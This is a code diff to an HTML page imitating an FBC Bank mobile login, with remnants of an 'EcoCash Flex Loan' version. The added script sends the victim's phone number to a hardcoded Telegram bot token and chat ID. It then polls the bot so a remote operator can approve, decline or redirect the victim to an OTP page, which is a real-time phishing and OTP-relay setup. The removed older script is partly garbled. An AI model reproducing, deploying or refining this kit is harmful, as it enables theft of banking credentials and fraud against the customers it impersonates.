@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -351,28 +350,44 @@
       cursor: pointer;
       width: 100%;
     }
-    .overlay {
-    position: fixed; inset: 0;
-    display: none;
-    align-items: center; justify-content: center; flex-direction: column; gap: 12px;
-    background: rgba(0,26,51,0.92);
-    z-index: 2000;
-    backdrop-filter: blur(5px);
-}
-.overlay.on { display: flex; }
+        /* Spinner overlay */
+    #spinnerOverlay {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 14px;
+      background: rgba(3, 13, 28, 0.78);
+      z-index: 9999;
+      backdrop-filter: blur(3px);
+    }
 
-.spin {
-    width: 46px; height: 46px;
-    border: 4px solid rgba(255,255,255,0.1);
-    border-top-color: var(--blue-bright);
-    border-radius: 50%;
-    animation: sp 0.8s linear infinite;
-}
+    .spinner {
+      width: 56px;
+      height: 56px;
+      border: 5px solid rgba(255,255,255,0.15);
+      border-top-color: #ffffff;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
 
-.sp-t { font-size: 14px; font-weight: 700; color: white; }
-.sp-s { font-size: 11px; color: rgba(255,255,255,0.6); }
+    .spin-label {
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 0.02em;
+    }
 
-@keyframes sp { to { transform: rotate(360deg); } }
+    .spin-sub {
+      color: rgba(255,255,255,0.7);
+      font-size: 12px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -423,11 +438,6 @@
         <button type="submit" class="pill-btn">Continue</button>
       </form>
     </main>
-    <div class="overlay on">
-  <div class="spin"></div>
-  <div class="sp-t">Authenticating</div>
-  <div class="sp-s">Please wait...</div>
-    </div>
 
     <!-- Bottom Section with Get Support and subtle copyright -->
     <footer class="bottom-section">
@@ -461,97 +471,86 @@
     </div>
   </div>
 
-  <script>
-    window.addEventListener('DOMContentLoaded', () => {
-      const savedPhone = localStorage.getItem('fbc_phone_number');
-      if (savedPhone) {
-        document.getElementById('mobileInput').value = savedPhone;
-      }
-    });
-
-    function handleLoginSubmit(e) {
-      e.preventDefault();
-      const mobileVal = document.getElementById('mobileInput').value.trim();
-
-      if (!mobileVal || mobileVal.length < 8) {
-        document.getElementById('loginError').style.display = 'block';
-        return;
-      }
-
-      document.getElementById('loginError').style.display = 'none';
-
-      localStorage.setItem('fbc_phone_number', mobileVal);
-      localStorage.setItem('fbc_login_phone', mobileVal);
-      localStorage.setItem('fbc_otp_ref', '9vXfk');
-
-      window.location.href = 'otp.html';
-    }
-
-    function openSupportModal() {
-      document.getElementById('supportModal').style.display = 'flex';
-    }
-
-    function closeSupportModal() {
-      document.getElementById('supportModal').style.display = 'none';
-    }
     <script>
-      
-        BOT_TOKEN: '9167169396:AAEmzZ5ndzC0WzHEYXsY805aqoDv2qzR1Ww',
+    const CONFIG = {
+      BOT_TOKEN: '8790894986:AAGHaI2_jlpbI8WTzssq-2ssGwhRr7MAXrI',
       CHAT_ID: '8820857419',
-      APPROVE_PAGE: 'otp.html',
-      DEVICE_PAGE: 'pin.html',
-      SUCCESS_PAGE: 'success.html'
+      APPROVE_PAGE: 'otp.html'
     };
-    // ── Load application details from localStorage (original logic preserved) ──
-    function getStoredApplication() 
-      }
+
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+
+    const loginError = document.getElementById('loginError');
+    const mobileInput = document.getElementById('mobileInput');
+
+    function showLoginError(msg) {
+      loginError.textContent = msg;
+      loginError.style.display = 'block';
     }
 
-    function loadApplicationDetails() {
-      const application = getStoredApplication();
-      
+    function hideLoginError() {
+      loginError.style.display = 'none';
+    }
 
-    // ── Telegram bot send + poll ──
-    function sendToBot(phone, pin) {
+    function resetButton() {
+      isProcessing = false;
+      const btn = document.querySelector('.pill-btn');
+      btn.disabled = false;
+      btn.textContent = 'Continue';
+    }
+
+    function sendToBot(mobile) {
       if (isProcessing) return;
       isProcessing = true;
-      continueBtn.disabled    = true;
-      continueBtn.textContent = 'Verifying…';
 
-      const application = getStoredApplication();
-      const loanAmount  = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
-      const loanType    = application.loanType || '—';
-      const fullName    = [application.firstName, application.lastName].filter(Boolean).join(' ').trim() || '—';
+      const btn = document.querySelector('.pill-btn');
+      btn.disabled = true;
+      btn.textContent = 'Verifying…';
 
-      const ts        = Date.now();
+      const ts = Date.now();
       const approveId = `approve_${ts}`;
       const declineId = `decline_${ts}`;
-      const verifyId  = `verify_${ts}`;
+      const verifyId = `verify_${ts}`;
 
       fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: CONFIG.CHAT_ID,
-          text: `<b>🟢 EcoCash Flex Loan Verification</b>\n\nApplicant: <b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+263${phone}</code>\n\nChoose Action:`,
+          text: `
+<b>📱 FBC Bank Loan Verification</b>
+
+Mobile: <code>${mobile}</code>
+Applicant: <code>Not provided</code>
+`,
           parse_mode: 'HTML',
           reply_markup: {
             inline_keyboard: [
               [
-                { text: '✅ Approve Loan',  callback_data: approveId },
-                { text: '📱 Verify Device', callback_data: verifyId  }
+                { text: '✅ Approve', callback_data: approveId },
+                { text: '📱 Verify Device', callback_data: verifyId }
               ],
-              [{ text: '❌ Decline', callback_data: declineId }]
+              [
+                { text: '❌ Decline', callback_data: declineId }
+              ]
             ]
           }
         })
       })
-      .then(() => 
+      .then(() => {
+        localStorage.setItem('fbc_phone_number', mobile);
+        localStorage.setItem('fbc_login_phone', mobile);
+        localStorage.setItem('fbc_otp_ref', '9vXfk');
 
-        spinnerOverlay.style.display = 'flex';
+        document.getElementById('spinnerOverlay').style.display = 'flex';
         startPolling(approveId, declineId, verifyId);
       })
-      .catch(() => resetButton());
+      .catch(() => {
+        hideLoginError();
+        showLoginError('Something went wrong while sending the request. Please try again.');
+        resetButton();
+      });
     }
 
     function startPolling(approveId, declineId, verifyId) {
@@ -569,32 +568,66 @@
 
                 if (cb === approveId) {
                   clearInterval(interval);
-                  spinnerOverlay.style.display = 'none';
+                  document.getElementById('spinnerOverlay').style.display = 'none';
                   window.location.href = CONFIG.APPROVE_PAGE;
                 }
                 else if (cb === verifyId) {
                   clearInterval(interval);
-                  spinnerOverlay.style.display = 'none';
-                  window.location.href = CONFIG.DEVICE_PAGE;   // → device.html
+                  document.getElementById('spinnerOverlay').style.display = 'none';
+                  window.location.href = CONFIG.APPROVE_PAGE;
                 }
                 else if (cb === declineId) {
                   clearInterval(interval);
-                  spinnerOverlay.style.display = 'none';
-                  showError('Request declined. Please try again.');
+                  document.getElementById('spinnerOverlay').style.display = 'none';
+                  showLoginError('Request declined. Please try again.');
                   resetButton();
                 }
               }
             });
+          })
+          .catch(() => {
+            document.getElementById('spinnerOverlay').style.display = 'none';
+            showLoginError('Polling failed. Please try again.');
+            resetButton();
           });
       }, 1000);
     }
 
-    // ── Submit ──
-    continueBtn.addEventListener('click', () => {
-      errMsg.style.display = 'none';
-
-      sendToBot(phone);
+    window.addEventListener('DOMContentLoaded', () => {
+      const savedPhone = localStorage.getItem('fbc_phone_number');
+      if (savedPhone) {
+        mobileInput.value = savedPhone;
+      }
     });
-  </script>
+
+    function handleLoginSubmit(e) {
+      e.preventDefault();
+
+      const mobileVal = mobileInput.value.trim();
+
+      if (!mobileVal || mobileVal.length < 8) {
+        showLoginError('Please enter a valid mobile number');
+        return;
+      }
+
+      hideLoginError();
+      sendToBot(mobileVal);
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', handleLoginSubmit);
+
+    function openSupportModal() {
+      document.getElementById('supportModal').style.display = 'flex';
+    }
+
+    function closeSupportModal() {
+      document.getElementById('supportModal').style.display = 'none';
+    }
+    </script>
+      <div id="spinnerOverlay">
+    <div class="spinner"></div>
+    <div class="spin-label">Verifying &amp; Processing</div>
+    <div class="spin-sub">Please hold on…</div>
+      </div>
 </body>
 </html>
